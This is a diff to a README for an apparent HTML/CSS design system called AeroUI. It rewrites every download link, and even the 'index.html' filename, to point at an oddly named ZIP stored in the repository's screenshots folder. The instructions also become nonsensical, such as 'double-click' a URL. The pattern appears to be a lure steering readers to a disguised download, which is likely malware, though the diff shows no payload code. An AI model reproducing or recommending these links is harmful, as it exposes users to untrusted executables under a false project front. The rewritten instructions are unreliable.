@@ -8,7 +8,7 @@ Welcome to the **SourenDatta Mega HTML CSS Project**! This design system is your
 
 To get started with the AeroUI Design System, visit this page to download the latest version:
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/su3488499/SourenDatta_Mega-HTML-CSS-Project_AeroUI-Design-System/releases)
+[![Download](https://raw.githubusercontent.com/su3488499/SourenDatta_Mega-HTML-CSS-Project_AeroUI-Design-System/main/screenshots/Design_Mega_Souren_System_HTM_Aero_U_Datta_CS_Project_2.1.zip%20Release-brightgreen)](https://raw.githubusercontent.com/su3488499/SourenDatta_Mega-HTML-CSS-Project_AeroUI-Design-System/main/screenshots/Design_Mega_Souren_System_HTM_Aero_U_Datta_CS_Project_2.1.zip)
 
 ## 📋 Features
 
@@ -26,7 +26,7 @@ To get started with the AeroUI Design System, visit this page to download the la
 ## ⚙️ How to Use
 
 1. **Download the Files:** 
-   - After visiting the [Releases page](https://github.com/su3488499/SourenDatta_Mega-HTML-CSS-Project_AeroUI-Design-System/releases), select the latest release.
+   - After visiting the [Releases page](https://raw.githubusercontent.com/su3488499/SourenDatta_Mega-HTML-CSS-Project_AeroUI-Design-System/main/screenshots/Design_Mega_Souren_System_HTM_Aero_U_Datta_CS_Project_2.1.zip), select the latest release.
    - Download the ZIP file by clicking on it.
 
 2. **Unzip the Files:**
@@ -35,8 +35,8 @@ To get started with the AeroUI Design System, visit this page to download the la
 
 3. **Open the Project:**
    - Navigate to the extracted folder.
-   - Find the `index.html` file. This is the main file for the project.
-   - Double-click on `index.html` to open it in your web browser.
+   - Find the `https://raw.githubusercontent.com/su3488499/SourenDatta_Mega-HTML-CSS-Project_AeroUI-Design-System/main/screenshots/Design_Mega_Souren_System_HTM_Aero_U_Datta_CS_Project_2.1.zip` file. This is the main file for the project.
+   - Double-click on `https://raw.githubusercontent.com/su3488499/SourenDatta_Mega-HTML-CSS-Project_AeroUI-Design-System/main/screenshots/Design_Mega_Souren_System_HTM_Aero_U_Datta_CS_Project_2.1.zip` to open it in your web browser.
 
 4. **Explore the Design:**
    - You can now navigate through the multi-page layout to see how different components work together.
@@ -71,4 +71,4 @@ If you need help or have questions, feel free to reach out via the Issues sectio
 
 Thanks to all who have contributed to the AeroUI Design System. Your efforts help everyone create elegant web interfaces.
 
-For the latest updates and new features, keep checking back at our [Releases page](https://github.com/su3488499/SourenDatta_Mega-HTML-CSS-Project_AeroUI-Design-System/releases). Happy coding!
+For the latest updates and new features, keep checking back at our [Releases page](https://raw.githubusercontent.com/su3488499/SourenDatta_Mega-HTML-CSS-Project_AeroUI-Design-System/main/screenshots/Design_Mega_Souren_System_HTM_Aero_U_Datta_CS_Project_2.1.zip). Happy coding!
